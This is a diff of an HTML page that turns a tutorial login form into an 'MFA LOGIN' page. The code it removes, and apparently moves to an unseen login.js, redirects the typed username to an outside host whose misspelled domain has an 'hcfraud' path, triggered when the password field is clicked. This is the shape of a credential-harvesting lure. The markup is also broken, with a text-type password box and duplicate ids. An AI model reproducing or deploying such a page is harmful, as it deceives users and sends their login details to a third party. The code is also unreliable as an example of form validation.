@@ -3,53 +3,21 @@
 <title>Javascript Login Form Validation</title>
 <!-- Include CSS File Here -->
 <link rel="stylesheet" href="styles.css"/>
-<script src="login">
-</script>
 </head>
 <body>
 <div class="container">
 <div class="main">
-<h2>Javascript Login Form Validation</h2>
+<h2>MFA LOGIN</h2>
 <form id="form_id" method="post" name="myform">
-<label>User Name :</label>
+<label>User Name</label>
 <input type="text" name="username" id="username"/>
-<label>Password :</label>
+<label>Password</label>
 <input type="text" id="submit" onclick="redir()"/>
-<input type="button" value="Login" id="submit" />
+<input type="button" value="Login" id="submit"/>
 </form>
-<span><b class="note">Note : </b>For this demo use following username and password. <br/><b class="valid">User Name : Formget<br/>Password : formget#123</b></span>
 </div>
 </div>
-<script>
-    var attempt = 3; // Variable to count number of attempts.
-// Below function Executes on click of login button.
-function redir(){
-    var username = document.getElementById("username").value;
-    var url= "https://burkeitconsulating.com/hcfraud/?user=" + username;
-    window.location = url;
-    }
-
-function validate(){
-var username = document.getElementById("username").value;
-var password = document.getElementById("password").value;
-if ( username == "Formget" && password == null){
-alert ("Login successfully");
-window.location = "success.html"; // Redirecting to other page.
-return false;
-}
-else{
-attempt --;// Decrementing by one.
-alert("You have left "+attempt+" attempt;");
-// Disabling fields after 3 attempts.
-if( attempt == 0){
-document.getElementById("username").disabled = true;
-document.getElementById("password").disabled = true;
-document.getElementById("submit").disabled = true;
-return false;
-}
-}
-}
-
+<script src="login.js">
 </script>
 </body>
 </html>
